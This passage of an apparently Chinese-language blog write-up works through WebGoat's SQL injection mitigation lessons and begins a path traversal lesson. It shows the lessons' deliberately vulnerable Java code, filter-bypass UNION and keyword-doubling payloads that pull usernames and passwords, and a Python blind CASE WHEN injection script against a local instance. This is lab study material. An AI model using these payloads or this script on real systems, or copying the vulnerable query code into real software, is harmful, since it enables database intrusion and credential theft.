ToolProvider.getSystemJavaCompiler();</span><br><span class="line">        <span class="comment">//        这里是通过命令行工具获取了一个Java的编译器</span></span><br><span class="line">        <span class="type">DiagnosticCollector</span> <span class="variable">diagnosticCollector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DiagnosticCollector</span>();</span><br><span class="line"><span class="comment">//        提供一种在列表中收集诊断信息的简单方法</span></span><br><span class="line">        <span class="type">StandardJavaFileManager</span> <span class="variable">fileManager</span> <span class="operator">=</span> compiler.getStandardFileManager(diagnosticCollector,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">//      通过编译器获取一个标准文件管理器 并传入一个 收集诊断信息的对象</span></span><br><span class="line">        <span class="type">JavaFileObject</span> <span class="variable">javaObjectFromString</span> <span class="operator">=</span> getJavaFileContentsAsString(s);</span><br><span class="line"><span class="comment">//        获取了文件对象</span></span><br><span class="line">        <span class="type">Iterable</span> <span class="variable">fileObjects</span> <span class="operator">=</span> Arrays.asList(javaObjectFromString);</span><br><span class="line"><span class="comment">//        将字符串转换成文件数组</span></span><br><span class="line">        JavaCompiler.<span class="type">CompilationTask</span> <span class="variable">task</span> <span class="operator">=</span> compiler.getTask(<span class="literal">null</span>,fileManager,diagnosticCollector,<span class="literal">null</span>,<span class="literal">null</span>,fileObjects);</span><br><span class="line"><span class="comment">//        null 表示使用err输出信息 fileManager 文件管理器 diagnosticCollector 诊断器 fileObjects要编译的编译单元</span></span><br><span class="line">        <span class="type">Boolean</span> <span class="variable">result</span> <span class="operator">=</span> task.call();</span><br><span class="line"><span class="comment">//        执行此编译任务</span></span><br><span class="line">        List&lt;Diagnostic&gt; diagnostics = diagnosticCollector.getDiagnostics();</span><br><span class="line"><span class="comment">//        返回诊断的结果</span></span><br><span class="line">        <span class="keyword">return</span> diagnostics;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> SimpleJavaFileObject <span class="title function_">getJavaFileContentsAsString</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">javaFileContents</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;import java.sql.*; public class TestClass &#123; static String DBUSER; static String DBPW; static String DBURL; public static void main(String[] args) &#123;&quot;</span> + s + <span class="string">&quot;&#125;&#125;&quot;</span>);</span><br><span class="line"><span class="comment">//        新建了StringBuilder 对象</span></span><br><span class="line">        <span class="type">JavaObjectFromString</span> <span class="variable">javaFileObject</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//        文件操作对象</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            javaFileObject = <span class="keyword">new</span> <span class="title class_">JavaObjectFromString</span>(<span class="string">&quot;TestClass.java&quot;</span>, javaFileContents.toString());</span><br><span class="line"><span class="comment">//            第一个为文件路径 第二个为文件内容</span></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception exception)&#123;</span><br><span class="line">            exception.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> javaFileObject;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">JavaObjectFromString</span> <span class="keyword">extends</span> <span class="title class_">SimpleJavaFileObject</span> &#123;</span><br><span class="line"><span class="comment">//        这里收件继承了 SimpleJavaFileObject 对象</span></span><br><span class="line">        <span class="keyword">private</span> <span class="type">String</span> <span class="variable">contents</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//      新建了一个 contents</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">JavaObjectFromString</span><span class="params">(String className, String contents)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="built_in">super</span>(<span class="keyword">new</span> <span class="title class_">URI</span>(className), Kind.SOURCE);</span><br><span class="line"><span class="comment">//            这里调动SimpleJavaFileObject 的构造方法 其中第一个参数为路径信息 第二个为文件类型 这里的source 代表.java结尾的常规文件</span></span><br><span class="line">            <span class="built_in">this</span>.contents = contents;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> CharSequence <span class="title function_">getCharContent</span><span class="params">(<span class="type">boolean</span> ignoreEncodingErrors)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="comment">//            这里获取字符内容</span></span><br><span class="line">            <span class="keyword">return</span> contents;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">check_text</span><span class="params">(String regex, String text)</span> &#123;</span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">p</span>  <span class="operator">=</span> Pattern.compile(regex,Pattern.CASE_INSENSITIVE);</span><br><span class="line"><span class="comment">//        不区分大小写的正则匹配</span></span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">m</span> <span class="operator">=</span> p.matcher(text);</span><br><span class="line"><span class="comment">//        匹配的文本</span></span><br><span class="line">        <span class="keyword">if</span> (m.find())</span><br><span class="line"><span class="comment">//            如果有发现</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写一串sql查询代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(DBURL, DBUSER, DBPW);</span><br><span class="line">            <span class="type">PreparedStatement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.prepareStatement(<span class="string">&quot;SELECT * FROM users WHERE name=?&quot;</span>);</span><br><span class="line">            stmt.setString(<span class="number">1</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">results</span> <span class="operator">=</span> stmt.executeQuery();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception  e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909111708681.png" alt="image-20220909111708681"></p>
<h4 id="SqlOnlyInputValidation"><a href="#SqlOnlyInputValidation" class="headerlink" title="SqlOnlyInputValidation"></a>SqlOnlyInputValidation</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.sql_injection.mitigation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.lessons.sql_injection.advanced.SqlInjectionLesson6a;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(value = &#123;&quot;SqlOnlyInputValidation-1&quot;, &quot;SqlOnlyInputValidation-2&quot;, &quot;SqlOnlyInputValidation-3&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlOnlyInputValidation</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SqlInjectionLesson6a lesson6a;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SqlOnlyInputValidation</span><span class="params">(SqlInjectionLesson6a lesson6a)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.lesson6a = lesson6a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/SqlOnlyInputValidation/attack&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">attack</span><span class="params">(<span class="meta">@RequestParam(&quot;userid_sql_only_input_validation&quot;)</span>String userid)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (userid.contains(<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line"><span class="comment">//            过滤sql语句中的空格</span></span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;SqlOnlyInputValidation-failed&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">AttackResult</span> <span class="variable">attackResult</span> <span class="operator">=</span> lesson6a.injectableQuery(userid);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AttackResult</span>(attackResult.isLessonCompleted(),attackResult.getFeedback(),attackResult.getOutput(),getClass().getSimpleName(),<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;/**/union/**/select/**/1,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,user_name,password,7/**/from/**/user_system_data/**//**/where/**/user_name/**/=&#x27;dave&#x27;/**//**/--</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909125018637.png" alt="image-20220909125018637"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;;select/**/*/**/from/**/user_system_data/**/--</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909125054080.png" alt="image-20220909125054080"></p>
<h4 id="SqlOnlyInputValidationOnKeywords"><a href="#SqlOnlyInputValidationOnKeywords" class="headerlink" title="SqlOnlyInputValidationOnKeywords"></a>SqlOnlyInputValidationOnKeywords</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.sql_injection.mitigation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.lessons.sql_injection.advanced.SqlInjectionLesson6a;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(value = &#123;&quot;SqlOnlyInputValidationOnKeywords-1&quot;, &quot;SqlOnlyInputValidationOnKeywords-2&quot;, &quot;SqlOnlyInputValidationOnKeywords-3&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlOnlyInputValidationOnKeywords</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SqlInjectionLesson6a lesson6a;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SqlOnlyInputValidationOnKeywords</span><span class="params">(SqlInjectionLesson6a lesson6a)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.lesson6a = lesson6a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/SqlOnlyInputValidationOnKeywords/attack&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">attack</span><span class="params">(<span class="meta">@RequestParam(&quot;userid_sql_only_input_validation_on_keywords&quot;)</span>String userId)</span>&#123;</span><br><span class="line">        userId = userId.toUpperCase().replace(<span class="string">&quot;FROM&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;SELECT&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (userId.contains(<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;SqlOnlyInputValidationOnKeywords-failed&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">AttackResult</span> <span class="variable">attackResult</span> <span class="operator">=</span> lesson6a.injectableQuery(userId);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AttackResult</span>(attackResult.isLessonCompleted(),attackResult.getFeedback(),attackResult.getOutput(),getClass().getSimpleName(),<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤的有问题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;;selselectect/**/*/**/frfromom/**/user_system_data/**/--</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909132411903.png" alt="image-20220909132411903"></p>
<h4 id="SqlInjectionLesson13"><a href="#SqlInjectionLesson13" class="headerlink" title="SqlInjectionLesson13"></a>SqlInjectionLesson13</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.sql_injection.mitigation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.LessonDataSource;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(value = &#123;&quot;SqlStringInjectionHint-mitigation-13-1&quot;, &quot;SqlStringInjectionHint-mitigation-13-2&quot;, &quot;SqlStringInjectionHint-mitigation-13-3&quot;, &quot;SqlStringInjectionHint-mitigation-13-4&quot;&#125;)</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlInjectionLesson13</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> LessonDataSource dataSource;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SqlInjectionLesson13</span><span class="params">(LessonDataSource dataSource)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.dataSource = dataSource;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/SqlInjectionMitigations/attack12a&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String ip)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection();</span><br><span class="line">             <span class="type">PreparedStatement</span> <span class="variable">preparedStatement</span> <span class="operator">=</span> connection.prepareStatement(<span class="string">&quot;select ip from servers where ip=? and hostname=?&quot;</span>))&#123;</span><br><span class="line">                preparedStatement.setString(<span class="number">1</span>,ip);</span><br><span class="line">                preparedStatement.setString(<span class="number">2</span>,<span class="string">&quot;webgoat-prd&quot;</span>);</span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> preparedStatement.executeQuery();</span><br><span class="line">            <span class="keyword">if</span> (resultSet.next())&#123;</span><br><span class="line">                <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">            log.error(<span class="string">&quot;Failed&quot;</span>,e);</span><br><span class="line">            <span class="keyword">return</span> (failed(<span class="built_in">this</span>).build());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Servers"><a href="#Servers" class="headerlink" title="Servers"></a>Servers</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.sql_injection.mitigation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.LessonDataSource;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;SqlInjectionMitigations/servers&quot;)</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Servers</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> LessonDataSource dataSource;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@AllArgsConstructor</span></span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> String id;</span><br><span class="line">        <span class="keyword">private</span> String hostname;</span><br><span class="line">        <span class="keyword">private</span> String ip;</span><br><span class="line">        <span class="keyword">private</span> String mac;</span><br><span class="line">        <span class="keyword">private</span> String status;</span><br><span class="line">        <span class="keyword">private</span> String description;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Servers</span><span class="params">(LessonDataSource dataSource)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.dataSource = dataSource;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(produces = MediaType.APPLICATION_JSON_VALUE)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> java.util.List&lt;Server&gt; <span class="title function_">sort</span><span class="params">(<span class="meta">@RequestParam</span> String column)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        List&lt;Server&gt; servers = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">var</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection()) &#123;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">var</span> <span class="variable">statement</span> <span class="operator">=</span> connection.prepareStatement(<span class="string">&quot;select id, hostname, ip, mac, status, description from SERVERS where status &lt;&gt; &#x27;out of order&#x27; order by &quot;</span> + column)) &#123;</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">var</span> <span class="variable">rs</span> <span class="operator">=</span> statement.executeQuery()) &#123;</span><br><span class="line">                    <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">                        <span class="type">Server</span> <span class="variable">server</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Server</span>(rs.getString(<span class="number">1</span>), rs.getString(<span class="number">2</span>), rs.getString(<span class="number">3</span>), rs.getString(<span class="number">4</span>), rs.getString(<span class="number">5</span>), rs.getString(<span class="number">6</span>));</span><br><span class="line">                        servers.add(server);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> servers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>case when 注入 </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909165709411.png" alt="image-20220909165709411"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909165743970.png" alt="image-20220909165743970"></p>
<p>构造下 写个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jsonpath</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line"><span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;JSESSIONID=UEYYFGS5YRma89jRPd-MgZmMsAaZcjprDvkwd_QE; XDEBUG_SESSION=XDEBUG_ECLIPSE; csrftoken=K3MAIhCJRXpvtFDEZL8jPBZBaqB4AQUx5URfXIFuNrZf1FouXjtMPTz8kZT9dpf3; rememberMe=K6J1EzKLEEGRyRq4Dk4GSgMqUEoPYPnI7K2GhLNeSk50azVUvwTHQdT78dE6ZMM0V+2xcbpWgT9m+SALVMYHt7ai6bMTERfZMAU2lHViA6IP4AyXh0eaLyzi0Gc9Va0epahdl6lvGna8/0DgSX1/YIqwFMQ7QFaCAAP1LtE/jkE3TQdk7UNBdvpfHWlMSOgZdJZoYhIGxBhnGJxCVX9E+vB3fcILABQBDKvFpYhlGMNl5LMSA+SyBZCCzGpz2e3MgljifDFgNbSmcwVCfFdGc32h78OWzTcZOCbYbOav2Lp5q7960r2iSNZnaI+aX7xDklYgEgxlL6Q6xtZihscVODPiG9Rcy95G9OsQlLfPycpmS8bYcBrvt3Go0lfFcrGY2Uo6vDxj67hj/73f0VpdgWRfXnk0VPSL9uxElbqjx3GAEU2uKf657Uc3e/DpiVsMwovQUIFTDsm78NdL/E6+ONXKCTHcXp+Vym+6ItYGTKlLvfdZwg9D5JXHrtMjwZJz; googtrans=/auto/zh-CN&quot;</span>&#125;</span><br><span class="line">passwd = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i +=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span>  c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        url = <span class="string">&quot;http://127.0.0.1:8080/WebGoat/SqlInjectionMitigations/servers?column=&quot;</span></span><br><span class="line">        <span class="comment"># 数据库</span></span><br><span class="line">        payload =  <span class="string">f&quot;(CASE substr((select group_concat(schema_name) from INFORMATION_SCHEMA.SCHEMATA),<span class="subst">&#123;i&#125;</span>,1) WHEN &#x27;<span class="subst">&#123;<span class="built_in">chr</span>(c)&#125;</span>&#x27; THEN id ELSE ip END)&quot;</span></span><br><span class="line">        <span class="comment"># 查表</span></span><br><span class="line">        payload =  <span class="string">f&quot;(CASE substr((select group_concat(table_name) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA=&#x27;123456&#x27;),<span class="subst">&#123;i&#125;</span>,1) WHEN &#x27;<span class="subst">&#123;<span class="built_in">chr</span>(c)&#125;</span>&#x27; THEN id ELSE ip END)&quot;</span></span><br><span class="line">        <span class="comment"># 列名</span></span><br><span class="line">        payload =  <span class="string">f&quot;(CASE substr((select group_concat(column_name) from INFORMATION_SCHEMA.columns where TABLE_NAME=&#x27;SERVERS&#x27;),<span class="subst">&#123;i&#125;</span>,1) WHEN &#x27;<span class="subst">&#123;<span class="built_in">chr</span>(c)&#125;</span>&#x27; THEN id ELSE ip END)&quot;</span></span><br><span class="line">        <span class="comment"># 数据</span></span><br><span class="line">        payload =  <span class="string">f&quot;(CASE substr((select group_concat(ip) from SERVERS where hostname=&#x27;webgoat-prd&#x27;),<span class="subst">&#123;i&#125;</span>,1) WHEN &#x27;<span class="subst">&#123;<span class="built_in">chr</span>(c)&#125;</span>&#x27; THEN id ELSE ip END)&quot;</span></span><br><span class="line">        url += payload</span><br><span class="line"></span><br><span class="line">        r = requests.get(url=url,headers=header)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        jsondata = json.loads(r.text)</span><br><span class="line">        ip = jsonpath.jsonpath(jsondata, <span class="string">&#x27;$[0].ip&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(ip) == <span class="built_in">list</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;192.168.4.0&#x27;</span> <span class="keyword">in</span> ip:</span><br><span class="line">                passwd += <span class="built_in">chr</span>(c)</span><br><span class="line">                <span class="built_in">print</span>(passwd)</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909165300411.png" alt="image-20220909165300411"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909165633821.png" alt="image-20220909165633821"></p>
<h2 id="path-traversal"><a href="#path-traversal" class="headerlink" title="path_traversal"></a>path_traversal</h2><h3 id="PathTraversal"><a href="#PathTraversal" class="headerlink" title="PathTraversal"></a>PathTraversal</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.path_traversal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PathTraversal</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Category.A3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;path-traversal-title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ProfileUpload"><a href="#ProfileUpload" class="headerlink" title="ProfileUpload"></a>ProfileUpload</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.path_traversal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.WebSession;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.multipart.MultipartFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.http.MediaType.ALL_VALUE;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.http.MediaType.APPLICATION_JSON_VALUE;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;path-traversal-profile.hint1&quot;, &quot;path-traversal-profile.hint2&quot;, &quot;path-traversal-profile.hint3&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProfileUpload</span> <span class="keyword">extends</span> <span 